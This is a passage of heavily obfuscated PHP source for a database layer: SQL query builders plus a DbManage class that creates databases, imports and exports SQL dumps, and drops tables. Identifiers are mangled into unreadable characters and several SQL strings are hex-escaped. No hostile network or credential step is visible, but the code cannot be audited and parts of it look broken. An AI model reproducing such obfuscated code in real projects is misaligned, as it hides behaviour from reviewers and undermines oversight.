$Ñóà < $è¼‚±ğä¬¸«; $Ñóà++) { $ ¢õÚù = is_array($Ü»Ì­ğ¡˜®[$Ñóà]) ? $Ü»Ì­ğ¡˜®[$Ñóà][1] : $Ü»Ì­ğ¡˜®[$Ñóà]; if ($ñ÷‰¡¿Ï†É[295] == strtolower($Ü»Ì­ğ¡˜®[$Ñóà][0])) { $â‹ï .= $ñ÷‰¡¿Ï†É[258] . $ŸÙ . $ñ÷‰¡¿Ï†É[50] . $ ¢õÚù . $ñ÷‰¡¿Ï†É[1009] . $¯Ÿæ¼• . $ñ÷‰¡¿Ï†É[50]; } else { $Í‰ó£®ã‘“ = is_array($Ü»Ì­ğ¡˜®[$Ñóà]) ? $this->exp[strtolower($Ü»Ì­ğ¡˜®[$Ñóà][0])] : $ñ÷‰¡¿Ï†É[985]; if (!$Í‰ó£®ã‘“ && is_array($Ü»Ì­ğ¡˜®[$Ñóà]) && in_array($Ü»Ì­ğ¡˜®[$Ñóà][0], array($ñ÷‰¡¿Ï†É[985], $ñ÷‰¡¿Ï†É[1002], $ñ÷‰¡¿Ï†É[1003], $ñ÷‰¡¿Ï†É[1004], $ñ÷‰¡¿Ï†É[1005], $ñ÷‰¡¿Ï†É[1006]))) { $Í‰ó£®ã‘“ = $Ü»Ì­ğ¡˜®[$Ñóà][0]; } $â‹ï .= $ñ÷‰¡¿Ï†É[258] . $ŸÙ . $ñ÷‰¡¿Ï†É[50] . $Í‰ó£®ã‘“ . $ñ÷‰¡¿Ï†É[50] . $this->parseValue($ ¢õÚù) . $ñ÷‰¡¿Ï†É[1009] . $¯Ÿæ¼• . $ñ÷‰¡¿Ï†É[50]; } } $â‹ï = substr($â‹ï, 0, -4); } } else { $â‹ï .= $ŸÙ . $ñ÷‰¡¿Ï†É[1013] . $this->parseValue($Ü»Ì­ğ¡˜®); } return $â‹ï; } protected function parseThinkWhere($ŞÊõ‰Ğ®, $”íú¬) { $â‡’²ŠüàƒÔ =& $_SERVER[ÀÆ]; $á®µƒµÊ = $â‡’²ŠüàƒÔ[33]; switch ($ŞÊõ‰Ğ®) { case $â‡’²ŠüàƒÔ[350]: $á®µƒµÊ = $”íú¬; break; case $â‡’²ŠüàƒÔ[996]: $á®µƒµÊ = is_string($”íú¬) ? $”íú¬ : substr($this->parseWhere($”íú¬), 6); break; case $â‡’²ŠüàƒÔ[1014]: parse_str($”íú¬, $ƒö ‰¦ŸÏ); if (isset($ƒö ‰¦ŸÏ[$â‡’²ŠüàƒÔ[991]])) { $ä£ = $â‡’²ŠüàƒÔ[50] . strtoupper($ƒö ‰¦ŸÏ[$â‡’²ŠüàƒÔ[991]]) . $â‡’²ŠüàƒÔ[50]; unset($ƒö ‰¦ŸÏ[$â‡’²ŠüàƒÔ[991]]); } else { $ä£ = $â‡’²ŠüàƒÔ[995]; } $…¬®–ÑØí = array(); foreach ($ƒö ‰¦ŸÏ as $å => $¢¿¿—€) { $…¬®–ÑØí[] = $this->parseKey($å) . $â‡’²ŠüàƒÔ[1013] . $this->parseValue($¢¿¿—€); } $á®µƒµÊ = implode($ä£, $…¬®–ÑØí); break; } return $á®µƒµÊ; } protected function parseLimit($Ú”) { $¶ŸŠ”Æ¹±à–Œ =& $_SERVER[ÀÆ]; return !empty($Ú”) ? $¶ŸŠ”Æ¹±à–Œ[48] . $Ú” . $¶ŸŠ”Æ¹±à–Œ[50] : $¶ŸŠ”Æ¹±à–Œ[33]; } protected function parseJoin($Úú„Ñ¼á”¯û) { $²Ò´ŒüĞæ =& $_SERVER[ÀÆ]; $ »’’úâœ–¿ = $²Ò´ŒüĞæ[33]; if (!empty($Úú„Ñ¼á”¯û)) { if (is_array($Úú„Ñ¼á”¯û)) { foreach ($Úú„Ñ¼á”¯û as $úÍİÄ¬ãëÇ‰ => $‹›¦Ã”ÛÎ) { if (!1 !== stripos($‹›¦Ã”ÛÎ, $²Ò´ŒüĞæ[1015])) { $ »’’úâœ–¿ .= $²Ò´ŒüĞæ[50] . $‹›¦Ã”ÛÎ; } else { $ »’’úâœ–¿ .= $²Ò´ŒüĞæ[1016] . $‹›¦Ã”ÛÎ; } } } else { $ »’’úâœ–¿ .= $²Ò´ŒüĞæ[1016] . $Úú„Ñ¼á”¯û; } } $ »’’úâœ–¿ = preg_replace($²Ò´ŒüĞæ[1017], think_config($²Ò´ŒüĞæ[923]) . $²Ò´ŒüĞæ[1018], $ »’’úâœ–¿); return $ »’’úâœ–¿; } protected function parseOrder($Ÿî¢µ´´ˆôÉ) { $œíÈÃôŸÓÀ =& $_SERVER[ÀÆ]; if (is_array($Ÿî¢µ´´ˆôÉ)) { $—‚¢â = array(); foreach ($Ÿî¢µ´´ˆôÉ as $ïøá®õÃ¶² => $ùì½©) { if (is_numeric($ïøá®õÃ¶²)) { $—‚¢â[] = $this->parseKey($ùì½©); } else { $ùì½© = in_array(strtoupper(trim($ùì½©)), array($œíÈÃôŸÓÀ[1019], $œíÈÃôŸÓÀ[1020])) ? $œíÈÃôŸÓÀ[50] . $ùì½© : $œíÈÃôŸÓÀ[33]; if (preg_match($œíÈÃôŸÓÀ[1021], $ïøá®õÃ¶²)) { $—‚¢â[] = $this->parseKey($ïøá®õÃ¶²) . $ùì½©; } else { think_exception($œíÈÃôŸÓÀ[1022] . $ïøá®õÃ¶²); } } } $Ÿî¢µ´´ˆôÉ = implode($œíÈÃôŸÓÀ[47], $—‚¢â); } return !empty($Ÿî¢µ´´ˆôÉ) ? $œíÈÃôŸÓÀ[1023] . $Ÿî¢µ´´ˆôÉ : $œíÈÃôŸÓÀ[33]; } protected function parseGroup($È°³Â„¯€) { $¨ß¢„çé =& $_SERVER[ÀÆ]; return !empty($È°³Â„¯€) ? $¨ß¢„çé[1024] . $È°³Â„¯€ : $¨ß¢„çé[33]; } protected function parseHaving($ş€½”Œ) { $çË›‘ëÒ² =& $_SERVER[ÀÆ]; return !empty($ş€½”Œ) ? $çË›‘ëÒ²[1025] . $ş€½”Œ : $çË›‘ëÒ²[33]; } protected function parseComment($²€Ÿ»ÂÇ§Ò²ñ) { $›åó’ =& $_SERVER[ÀÆ]; return !empty($²€Ÿ»ÂÇ§Ò²ñ) ? $›åó’[1026] . $²€Ÿ»ÂÇ§Ò²ñ . $›åó’[1027] : $›åó’[33]; } protected function parseDistinct($–øªèî‹×ª) { $æî =& $_SERVER[ÀÆ]; return !empty($–øªèî‹×ª) ? $æî[1028] : $æî[33]; } protected function parseUnion($şİŒî·) { $Ğ©–È =& $_SERVER[ÀÆ]; if (empty($şİŒî·)) { return $Ğ©–È[33]; } if (isset($şİŒî·[$Ğ©–È[346]])) { $Û§Û×Ï = $Ğ©–È[1029]; unset($şİŒî·[$Ğ©–È[346]]); } else { $Û§Û×Ï = $Ğ©–È[1030]; } foreach ($şİŒî· as $ñ¼) { $®”ƒéëá[] = $Û§Û×Ï . (is_array($ñ¼) ? $this->buildSelectSql($ñ¼) : $ñ¼); } return implode($Ğ©–È[50], $®”ƒéëá); } public function insert($«Ã, $š–Ç´ = array(), $Ò‚Ã÷Æ‘Å = false) { $‚¶ÔŒ„ğ›¦Åá =& $_SERVER[ÀÆ]; $­¿ã±âò¦ = $ğ¦°¬¶‚Í¼²à = array(); $this->model = $š–Ç´[$‚¶ÔŒ„ğ›¦Åá[279]]; foreach ($«Ã as $ùéøÒÛ‹¶ => $ß£’Ò¯Ì¡¡Ğü) { if (is_array($ß£’Ò¯Ì¡¡Ğü) && $‚¶ÔŒ„ğ›¦Åá[295] == $ß£’Ò¯Ì¡¡Ğü[0]) { $ğ¦°¬¶‚Í¼²à[] = $this->parseKey($ùéøÒÛ‹¶); $­¿ã±âò¦[] = $ß£’Ò¯Ì¡¡Ğü[1]; } elseif (is_scalar($ß£’Ò¯Ì¡¡Ğü) || is_null($ß£’Ò¯Ì¡¡Ğü)) { $ğ¦°¬¶‚Í¼²à[] = $this->parseKey($ùéøÒÛ‹¶); $­¿ã±âò¦[] = $this->parseValue($ß£’Ò¯Ì¡¡Ğü); } } $ı¬ÎÇŸ = ($Ò‚Ã÷Æ‘Å ? $‚¶ÔŒ„ğ›¦Åá[901] : $‚¶ÔŒ„ğ›¦Åá[902]) . $‚¶ÔŒ„ğ›¦Åá[903] . $this->parseTable($š–Ç´[$‚¶ÔŒ„ğ›¦Åá[277]]) . $‚¶ÔŒ„ğ›¦Åá[897] . implode($‚¶ÔŒ„ğ›¦Åá[47], $ğ¦°¬¶‚Í¼²à) . $‚¶ÔŒ„ğ›¦Åá[898] . implode($‚¶ÔŒ„ğ›¦Åá[47], $­¿ã±âò¦) . $‚¶ÔŒ„ğ›¦Åá[899]; $ı¬ÎÇŸ .= $this->parseLock(isset($š–Ç´[$‚¶ÔŒ„ğ›¦Åá[836]]) ? $š–Ç´[$‚¶ÔŒ„ğ›¦Åá[836]] : !1); $ı¬ÎÇŸ .= $this->parseComment(!empty($š–Ç´[$‚¶ÔŒ„ğ›¦Åá[352]]) ? $š–Ç´[$‚¶ÔŒ„ğ›¦Åá[352]] : $‚¶ÔŒ„ğ›¦Åá[33]); return $this->execute($ı¬ÎÇŸ, $this->parseBind(!empty($š–Ç´[$‚¶ÔŒ„ğ›¦Åá[283]]) ? $š–Ç´[$‚¶ÔŒ„ğ›¦Åá[283]] : array())); } public function selectInsert($œü, $¡Ğ›ÚËß‹ù‰, $œî = array()) { $©ë úê =& $_SERVER[ÀÆ]; $this->model = $œî[$©ë úê[279]]; if (is_string($œü)) { $œü = explode($©ë úê[47], $œü); } array_walk($œü, array($this, $©ë úê[900])); $Ÿè’×î = $©ë úê[1031] . $this->parseTable($¡Ğ›ÚËß‹ù‰) . $©ë úê[897] . implode($©ë úê[47], $œü) . $©ë úê[1009]; $Ÿè’×î .= $this->buildSelectSql($œî); return $this->execute($Ÿè’×î, $this->parseBind(!empty($œî[$©ë úê[283]]) ? $œî[$©ë úê[283]] : array())); } public function update($šû¤, $²¯Á¯ğ) { $øğ½øÕšÉÉ =& $_SERVER[ÀÆ]; $this->model = $²¯Á¯ğ[$øğ½øÕšÉÉ[279]]; $‚£Õ…ï = $øğ½øÕšÉÉ[1032] . $this->parseTable($²¯Á¯ğ[$øğ½øÕšÉÉ[277]]) . $this->parseSet($šû¤) . $this->parseWhere(!empty($²¯Á¯ğ[$øğ½øÕšÉÉ[273]]) ? $²¯Á¯ğ[$øğ½øÕšÉÉ[273]] : $øğ½øÕšÉÉ[33]) . $this->parseOrder(!empty($²¯Á¯ğ[$øğ½øÕšÉÉ[363]]) ? $²¯Á¯ğ[$øğ½øÕšÉÉ[363]] : $øğ½øÕšÉÉ[33]) . $this->parseLimit(!empty($²¯Á¯ğ[$øğ½øÕšÉÉ[290]]) ? $²¯Á¯ğ[$øğ½øÕšÉÉ[290]] : $øğ½øÕšÉÉ[33]) . $this->parseLock(isset($²¯Á¯ğ[$øğ½øÕšÉÉ[836]]) ? $²¯Á¯ğ[$øğ½øÕšÉÉ[836]] : !1) . $this->parseComment(!empty($²¯Á¯ğ[$øğ½øÕšÉÉ[352]]) ? $²¯Á¯ğ[$øğ½øÕšÉÉ[352]] : $øğ½øÕšÉÉ[33]); return $this->execute($‚£Õ…ï, $this->parseBind(!empty($²¯Á¯ğ[$øğ½øÕšÉÉ[283]]) ? $²¯Á¯ğ[$øğ½øÕšÉÉ[283]] : array())); } public function delete($àÜ = array()) { $”¯ =& $_SERVER[ÀÆ]; $this->model = $àÜ[$”¯[279]]; $¤³­¨ùƒœ = $”¯[1033] . $this->parseTable($àÜ[$”¯[277]]) . $this->parseWhere(!empty($àÜ[$”¯[273]]) ? $àÜ[$”¯[273]] : $”¯[33]) . $this->parseOrder(!empty($àÜ[$”¯[363]]) ? $àÜ[$”¯[363]] : $”¯[33]) . $this->parseLimit(!empty($àÜ[$”¯[290]]) ? $àÜ[$”¯[290]] : $”¯[33]) . $this->parseLock(isset($àÜ[$”¯[836]]) ? $àÜ[$”¯[836]] : !1) . $this->parseComment(!empty($àÜ[$”¯[352]]) ? $àÜ[$”¯[352]] : $”¯[33]); return $this->execute($¤³­¨ùƒœ, $this->parseBind(!empty($àÜ[$”¯[283]]) ? $àÜ[$”¯[283]] : array())); } public function select($›ê = array()) { $æé¤ëÓ¨Ï =& $_SERVER[ÀÆ]; $this->model = $›ê[$æé¤ëÓ¨Ï[279]]; $ë–› = $this->buildSelectSql($›ê); $¡ı±ĞŒá’² = isset($›ê[$æé¤ëÓ¨Ï[347]]) ? $›ê[$æé¤ëÓ¨Ï[347]] : !1; if ($¡ı±ĞŒá’²) { $†ê“¾óÔÌ® = is_string($¡ı±ĞŒá’²[$æé¤ëÓ¨Ï[93]]) ? $¡ı±ĞŒá’²[$æé¤ëÓ¨Ï[93]] : $æé¤ëÓ¨Ï[1034] . md5($ë–›); $Î­óˆ‰ = think_cache($†ê“¾óÔÌ®, $æé¤ëÓ¨Ï[33], $¡ı±ĞŒá’²); if (!1 !== $Î­óˆ‰) { return $Î­óˆ‰; } } $ñç·ä¥ºÌãĞ¥ = $this->query($ë–›, $this->parseBind(!empty($›ê[$æé¤ëÓ¨Ï[283]]) ? $›ê[$æé¤ëÓ¨Ï[283]] : array())); if ($¡ı±ĞŒá’² && !1 !== $ñç·ä¥ºÌãĞ¥) { think_cache($†ê“¾óÔÌ®, $ñç·ä¥ºÌãĞ¥, $¡ı±ĞŒá’²); } return $ñç·ä¥ºÌãĞ¥; } public function buildSelectSql($÷ºòı¢È³ŒÈ = array()) { $ÈË¦Üª« =& $_SERVER[ÀÆ]; if (isset($÷ºòı¢È³ŒÈ[$ÈË¦Üª«[351]])) { if (strpos($÷ºòı¢È³ŒÈ[$ÈË¦Üª«[351]], $ÈË¦Üª«[47])) { list($”, $·÷¸§—ôìªÀ) = explode($ÈË¦Üª«[47], $÷ºòı¢È³ŒÈ[$ÈË¦Üª«[351]]); } else { $” = $÷ºòı¢È³ŒÈ[$ÈË¦Üª«[351]]; } $” = $” ? $” : 1; $·÷¸§—ôìªÀ = isset($·÷¸§—ôìªÀ) ? $·÷¸§—ôìªÀ : (is_numeric($÷ºòı¢È³ŒÈ[$ÈË¦Üª«[290]]) ? $÷ºòı¢È³ŒÈ[$ÈË¦Üª«[290]] : 20); $µŞ¯‚„›¶ùÌ = $·÷¸§—ôìªÀ * ((int) $” - 1); $÷ºòı¢È³ŒÈ[$ÈË¦Üª«[290]] = $µŞ¯‚„›¶ùÌ . $ÈË¦Üª«[47] . $·÷¸§—ôìªÀ; } if (think_config($ÈË¦Üª«[1035])) { $í¸¯ì¸‡‚éıì = $ÈË¦Üª«[1036] . md5(serialize($÷ºòı¢È³ŒÈ)); $ô® = think_cache($í¸¯ì¸‡‚éıì); if ($ô®) { return $ô®; } } $ÜùÛ¨ = $this->parseSql($this->selectSql, $÷ºòı¢È³ŒÈ); $ÜùÛ¨ .= $this->parseLock(isset($÷ºòı¢È³ŒÈ[$ÈË¦Üª«[836]]) ? $÷ºòı¢È³ŒÈ[$ÈË¦Üª«[836]] : !1); if (isset($í¸¯ì¸‡‚éıì)) { think_cache($í¸¯ì¸‡‚éıì, $ÜùÛ¨); } return $ÜùÛ¨; } public function parseSql($§íÑ, $š»œ»ËÓ« = array()) { $Åï·ÀÃô•ó =& $_SERVER[ÀÆ]; $§íÑ = str_replace(array($Åï·ÀÃô•ó[1037], $Åï·ÀÃô•ó[1038], $Åï·ÀÃô•ó[1039], $Åï·ÀÃô•ó[1040], $Åï·ÀÃô•ó[1041], $Åï·ÀÃô•ó[1042], $Åï·ÀÃô•ó[1043], $Åï·ÀÃô•ó[1044], $Åï·ÀÃô•ó[1045], $Åï·ÀÃô•ó[1046], $Åï·ÀÃô•ó[1047]), array($this->parseTable("{$š»œ»ËÓ«[$Åï·ÀÃô•ó[277]]}"), $this->parseDistinct(isset($š»œ»ËÓ«[$Åï·ÀÃô•ó[1048]]) ? $š»œ»ËÓ«[$Åï·ÀÃô•ó[1048]] : !1), $this->parseField(!empty($š»œ»ËÓ«[$Åï·ÀÃô•ó[271]]) ? $š»œ»ËÓ«[$Åï·ÀÃô•ó[271]] : $Åï·ÀÃô•ó[182]), $this->parseJoin(!empty($š»œ»ËÓ«[$Åï·ÀÃô•ó[280]]) ? $š»œ»ËÓ«[$Åï·ÀÃô•ó[280]] : $Åï·ÀÃô•ó[33]), $this->parseWhere(!empty($š»œ»ËÓ«[$Åï·ÀÃô•ó[273]]) ? $š»œ»ËÓ«[$Åï·ÀÃô•ó[273]] : $Åï·ÀÃô•ó[33]), $this->parseGroup(!empty($š»œ»ËÓ«[$Åï·ÀÃô•ó[509]]) ? $š»œ»ËÓ«[$Åï·ÀÃô•ó[509]] : $Åï·ÀÃô•ó[33]), $this->parseHaving(!empty($š»œ»ËÓ«[$Åï·ÀÃô•ó[1049]]) ? $š»œ»ËÓ«[$Åï·ÀÃô•ó[1049]] : $Åï·ÀÃô•ó[33]), $this->parseOrder(!empty($š»œ»ËÓ«[$Åï·ÀÃô•ó[363]]) ? $š»œ»ËÓ«[$Åï·ÀÃô•ó[363]] : $Åï·ÀÃô•ó[33]), $this->parseLimit(!empty($š»œ»ËÓ«[$Åï·ÀÃô•ó[290]]) ? $š»œ»ËÓ«[$Åï·ÀÃô•ó[290]] : $Åï·ÀÃô•ó[33]), $this->parseUnion(!empty($š»œ»ËÓ«[$Åï·ÀÃô•ó[345]]) ? $š»œ»ËÓ«[$Åï·ÀÃô•ó[345]] : $Åï·ÀÃô•ó[33]), $this->parseComment(!empty($š»œ»ËÓ«[$Åï·ÀÃô•ó[352]]) ? $š»œ»ËÓ«[$Åï·ÀÃô•ó[352]] : $Åï·ÀÃô•ó[33])), $§íÑ); return $§íÑ; } public function getLastSql($¶ = '') { return $¶ ? $this->modelSql[$¶] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($££ü©) { return addslashes($££ü©); } public function setModel($ƒÜ’Ä) { $this->model = $ƒÜ’Ä; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ÚåŒĞ, $Â¾é£½©†ğ– = '') { $this->database = $ÚåŒĞ; $this->type = $Â¾é£½©†ğ–; } public function model($õÌ = '') { return new ModelBase($õÌ, $_SERVER[ÀÆ][33], $this->database); } public function db($¢·÷¾íˆ¡ = false) { $áíÉ¦º =& $_SERVER[ÀÆ]; $³çŞÃÙô­ = array_change_key_case($this->database); if ($this->type == $áíÉ¦º[9] || !$¢·÷¾íˆ¡) { return $this->model(); } $íú¯ñà = $³çŞÃÙô­[$áíÉ¦º[963]]; $³çŞÃÙô­[$áíÉ¦º[963]] = $áíÉ¦º[33]; if ($³çŞÃÙô­[$áíÉ¦º[781]] == $áíÉ¦º[782]) { $È¿¦³Çâ = $³çŞÃÙô­[$áíÉ¦º[783]]; $³çŞÃÙô­[$áíÉ¦º[783]] = substr($È¿¦³Çâ, 0, strrpos($È¿¦³Çâ, $áíÉ¦º[1050])); } $this->database = $³çŞÃÙô­; $›Æ” = $this->model(); try { $Ş¡á³”ĞØ„« = $›Æ”->execute("\163\150\157\167\40\x64\141\x74\x61\142\141\163\145\163\x20\154\x69\153\145\40\47{$íú¯ñà}\47"); } catch (Exception $‘”•êÏ’âı) { } if (!$Ş¡á³”ĞØ„«) { $›Æ”->execute("\143\x72\x65\141\x74\x65\40\x64\x61\164\x61\142\141\x73\145\x20\x60{$íú¯ñà}\140"); } $³çŞÃÙô­[$áíÉ¦º[963]] = $íú¯ñà; if ($³çŞÃÙô­[$áíÉ¦º[781]] == $áíÉ¦º[782]) { $³çŞÃÙô­[$áíÉ¦º[783]] .= $áíÉ¦º[1050] . $íú¯ñà; } $this->database = $³çŞÃÙô­; $›Æ”->execute("\x75\x73\145\40\x60{$íú¯ñà}\x60"); return $›Æ”; } public function createTable($ŠÔó, $‹Šıû¹ûàÛ = null) { $ğ¾ =& $_SERVER[ÀÆ]; if (!IO::exist($ŠÔó)) { ActionCall($ğ¾[1051], !0, 0); show_json(LNG($ğ¾[1052]), !1); } $ô¤Ì†¤¢ıñ = sqlSplit(IO::getContent($ŠÔó)); foreach ($ô¤Ì†¤¢ıñ as $”„ªÈ¥Ê) { if ($‹Šıû¹ûàÛ) { $Äç›²¾Ç = stripos($”„ªÈ¥Ê, $ğ¾[1053]) === 0; if ($Äç›²¾Ç) { $‹Šıû¹ûàÛ->task[$ğ¾[1054]] += 1; } } $this->model()->execute($”„ªÈ¥Ê); if ($‹Šıû¹ûàÛ && $Äç›²¾Ç) { preg_match($ğ¾[1055], $”„ªÈ¥Ê, $½œ´Ü‰µ); $‹Šıû¹ûàÛ->task[$ğ¾[1056]] = $½œ´Ü‰µ[1]; $‹Šıû¹ûàÛ->update(1); } } $this->taskToCache($‹Šıû¹ûàÛ); } public function insertTable($‘Ï Ö£÷, $¯ÙÀô = null) { $ÂÙŒÙÙß¼›£€ =& $_SERVER[ÀÆ]; $òûóîÈÑ±îµ = $this->model(); $»ëğ¿„ = $ÉÇ·‚øË ? array($ÉÇ·‚øË) : $òûóîÈÑ±îµ->getTables(); foreach ($‘Ï Ö£÷ as $öÒº§Ñ) { $ÉÇ·‚øË = basename($öÒº§Ñ, $ÂÙŒÙÙß¼›£€[771]); if (!in_array($ÉÇ·‚øË, $»ëğ¿„)) { continue; } if ($¯ÙÀô) { $¯ÙÀô->task[$ÂÙŒÙÙß¼›£€[1056]] = $ÉÇ·‚øË; } if (get_filesize($öÒº§Ñ) == 0) { continue; } $¶£¨‘­ = $this->sqlToDb($öÒº§Ñ, $¯ÙÀô); if (!$¶£¨‘­) { ActionCall($ÂÙŒÙÙß¼›£€[1051], !0, 0); show_json(LNG($ÂÙŒÙÙß¼›£€[1057]) . "\133{$ÉÇ·‚øË}\135", !1); } } $this->taskToCache($¯ÙÀô); } public function sqlFromDb($äš¦, $–ªæÀ˜û‚ø, $¢Ÿê Êâ¥ì½Ü = null, $Æ ‘ = null) { if ($¢Ÿê Êâ¥ì½Ü) { $¢Ÿê Êâ¥ì½Ü->task[$_SERVER[ÀÆ][1056]] = $äš¦; } $ÀÑŠªş­áë = $this->model($äš¦); $¸åÄÒ• = 0; $Æ†ÒÖ‚âıƒ = 0; $Œ„Ï = 10000; $¶Şï« = fopen($–ªæÀ˜û‚ø, $_SERVER[ÀÆ][1058]); $ = $ÀÑŠªş­áë->getPk(); $©Äô¬ÀÃ = $ÀÑŠªş­áë->getDbFields(); do { $ñ÷º = array($ => array($_SERVER[ÀÆ][1005], $Æ†ÒÖ‚âıƒ)); $çÅŠé = $ÀÑŠªş­áë->where($ñ÷º)->field($©Äô¬ÀÃ)->order($ . $_SERVER[ÀÆ][1059])->limit($Œ„Ï)->select(); $çÅŠé = !empty($çÅŠé) ? $çÅŠé : array(); if (!($˜ = count($çÅŠé))) { break; } $ø±¡ÙÆıÛø˜ = end($çÅŠé); $Æ†ÒÖ‚âıƒ = $ø±¡ÙÆıÛø˜[$]; $Î™ÁïÍï× = array(); foreach ($çÅŠé as $ÂÁ˜ÔÑ’¹‘„ß) { if ($äš¦ == $_SERVER[ÀÆ][1060] && $ÂÁ˜ÔÑ’¹‘„ß[$_SERVER[ÀÆ][29]] == $_SERVER[ÀÆ][1061]) { $·Àú’óŞÉ§ = json_decode($ÂÁ˜ÔÑ’¹‘„ß[$_SERVER[ÀÆ][372]], !0); if ($·Àú’óŞÉ§[$_SERVER[ÀÆ][28]] == date($_SERVER[ÀÆ][736]) && !$·Àú’óŞÉ§[$_SERVER[ÀÆ][735]]) { continue; } } if ($Æ ‘) { $ÂÁ˜ÔÑ’¹‘„ß[$_SERVER[ÀÆ][76]] = "\173\151\157\x3a{$Æ ‘}\175" . substr($ÂÁ˜ÔÑ’¹‘„ß[$_SERVER[ÀÆ][76]], strlen("\173\151\157\x3a{$ÂÁ˜ÔÑ’¹‘„ß[$_SERVER[ÀÆ][809]]}\x7d")); $ÂÁ˜ÔÑ’¹‘„ß[$_SERVER[ÀÆ][809]] = $Æ ‘; } $Î™ÁïÍï×[] = $_SERVER[ÀÆ][1062] . $this->sqlEncode($ÂÁ˜ÔÑ’¹‘„ß) . $_SERVER[ÀÆ][1063]; } $¸Ù„—Ÿ¦î = "\x49\116\123\105\122\124\x20\111\x4e\124\x4f\x20\140{$äš¦}\140\x20\50\x60" . implode($_SERVER[ÀÆ][1064], $©Äô¬ÀÃ) . $_SERVER[ÀÆ][1065]; fwrite($¶Şï«, $¸Ù„—Ÿ¦î . implode($_SERVER[ÀÆ][1066], $Î™ÁïÍï×) . $_SERVER[ÀÆ][68] . PHP_EOL); $¸åÄÒ• += $˜; if ($¢Ÿê Êâ¥ì½Ü) { $¢Ÿê Êâ¥ì½Ü->update($˜); } } while ($Œ„Ï == $˜); fclose($¶Şï«); return $¸åÄÒ•; } public function sqlToDb($Âü, $ú™‡ = null) { $éå„ ¿˜è€˜ =& $_SERVER[ÀÆ]; $…Îö´³×€Üñ = $this->model(); $ôÏÅğãã‹ = @fopen($Âü, $éå„ ¿˜è€˜[1067]); if (!$ôÏÅğãã‹) { return !1; } $ƒô©éñô = 0; $ëÑñã = $éå„ ¿˜è€˜[33]; $Œò¡çë¢‡Ôş¾ = array(); $¯è = $this->type == $éå„ ¿˜è€˜[9] ? 500 : 2000; $‹¥ = basename($Âü, $éå„ ¿˜è€˜[771]); $°ŸÂçùÛıä•¨ = 0; $¿‚âæÁ“åñÛ‡ = 4194304 - 104858; $¢½Şä = 1000000 - 104858; while (!feof($ôÏÅğãã‹)) { $é‰‰ÔëÆÆŠ¨Ö = trim(fgets($ôÏÅğãã‹)); if (!$é‰‰ÔëÆÆŠ¨Ö) { continue; } $¢¶Ÿ›áÒëÕ©¾ = $this->sqlDecode($é‰‰ÔëÆÆŠ¨Ö, $this->type); if (stripos($¢¶Ÿ›áÒëÕ©¾, $éå„ ¿˜è€˜[353]) === 0) { if (!$ëÑñã) { $ëÑñã = $¢¶Ÿ›áÒëÕ©¾ . $éå„ ¿˜è€˜[50]; } continue; } if ($ú™‡) { $ú™‡->task[$éå„ ¿˜è€˜[1054]] += 1; } $ƒô©éñô++; $Œò¡çë¢‡Ôş¾[] = rtrim(rtrim(trim($¢¶Ÿ›áÒëÕ©¾), $éå„ ¿˜è€˜[47]), $éå„ ¿˜è€˜[68]); $¥˜Û‚Íİ­ÍÓŞ = null; $‚Ş = strlen($¢¶Ÿ›áÒëÕ©¾); $°ŸÂçùÛıä•¨ += $‚Ş; if ($°ŸÂçùÛıä•¨ >= ($¯è == 500 ? $¿‚âæÁ“åñÛ‡ : $¢½Şä)) { $¥˜Û‚Íİ­ÍÓŞ = array_pop($Œò¡çë¢‡Ôş¾); if ($ƒô©éñô > 1) { $ƒô©éñô--; } } if ($ƒô©éñô >= $¯è || $¥˜Û‚Íİ­ÍÓŞ) { $¢¶Ÿ›áÒëÕ©¾ = $ëÑñã . implode($éå„ ¿˜è€˜[47], $Œò¡çë¢‡Ôş¾); if (!$…Îö´³×€Üñ->execute($¢¶Ÿ›áÒëÕ©¾)) { return !1; } if ($ú™‡) { $ú™‡->update($ƒô©éñô); } $Œò¡çë¢‡Ôş¾ = array(); $ƒô©éñô = 0; $°ŸÂçùÛıä•¨ = 0; if ($¥˜Û‚Íİ­ÍÓŞ) { $Œò¡çë¢‡Ôş¾ = array($¥˜Û‚Íİ­ÍÓŞ); $ƒô©éñô = 1; $°ŸÂçùÛıä•¨ = $‚Ş; } } } fclose($ôÏÅğãã‹); if (!empty($Œò¡çë¢‡Ôş¾)) { $¢¶Ÿ›áÒëÕ©¾ = $ëÑñã . implode($éå„ ¿˜è€˜[47], $Œò¡çë¢‡Ôş¾); if (!$…Îö´³×€Üñ->execute($¢¶Ÿ›áÒëÕ©¾)) { return !1; } if ($ú™‡) { $ú™‡->update($ƒô©éñô); } } return !0; } public function dropTable($ïáÍÕˆÈŠèÀ = null) { $‘´¦íš›¦ = $this->model(); $¥Ùó¡ÈÙ = $ïáÍÕˆÈŠèÀ ? array($ïáÍÕˆÈŠèÀ) : $‘´¦íš›¦->getTables(); if (!$¥Ùó¡ÈÙ) { return; } foreach ($¥Ùó¡ÈÙ as $ïáÍÕˆÈŠèÀ) { if ($ïáÍÕˆÈŠèÀ) { $ïáÍÕˆÈŠèÀ = strtolower($ïáÍÕˆÈŠèÀ); } else { continue; } $‘´¦íš›¦->execute("\144\x72\157\160\40\x74\x61\142\154\145\40\x69\x66\x20\x65\x78\x69\163\x74\163\x20\x60{$ïáÍÕˆÈŠèÀ}\140"); } } private function taskToCache($Áà­ŠüÃçÏ = null) { $ŒÈëõ×› =& $_SERVER[ÀÆ]; if (!$Áà­ŠüÃçÏ) { return; } $î‰êëõ¡Ğ­É = array($ŒÈëõ×›[1056] => $Áà­ŠüÃçÏ->task[$ŒÈëõ×›[1056]], $ŒÈëõ×›[1054] => $Áà­ŠüÃçÏ->task[$ŒÈëõ×›[1054]], $ŒÈëõ×›[1068] => $Áà­ŠüÃçÏ->task[$ŒÈëõ×›[1068]]); if ($î‰êëõ¡Ğ­É[$ŒÈëõ×›[1054]] == $î‰êëõ¡Ğ­É[$ŒÈëõ×›[1068]]) { $î‰êëõ¡Ğ­É[$ŒÈëõ×›[745]] = 1; } Cache::set($ŒÈëõ×›[1069] . $Áà­ŠüÃçÏ->task[$ŒÈëõ×›[395]], $î‰êëõ¡Ğ­É); $Áà­ŠüÃçÏ->end(); } private function sqlEncode($Ä°™©§) { $ûàªÛÓ‰° =& $_SERVER[ÀÆ]; $ê›‰±Å = array(); foreach ($Ä°™©§ as $Ãéßó÷½Âœ) { if (is_array($Ãéßó÷½Âœ)) { $Ãéßó÷½Âœ = json_encode_force($Ãéßó÷½Âœ); } $Ãéßó÷½Âœ = 